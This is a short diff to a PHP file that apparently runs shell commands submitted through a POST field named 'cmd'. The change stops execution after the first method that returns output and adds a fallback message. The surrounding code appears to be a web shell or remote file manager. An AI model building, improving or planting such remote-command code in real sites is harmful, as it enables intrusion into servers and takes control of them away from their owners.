@@ -463,10 +463,12 @@ if (isset($_POST['cmd'])) {
     if ($output !== null) {
         echo "<pre>Result Code: $resultCode</pre>";
         echo "<pre>$output</pre>";
-    } else {
-        echo "<pre>No output generated.</pre>";
+        echo "</div>";
+        return; // Stop execution after the first successful command
     }
 
+    // Fallback if no method succeeded
+    echo "<pre>No output generated.</pre>";
     echo "</div>";
 }
         // Create a new file
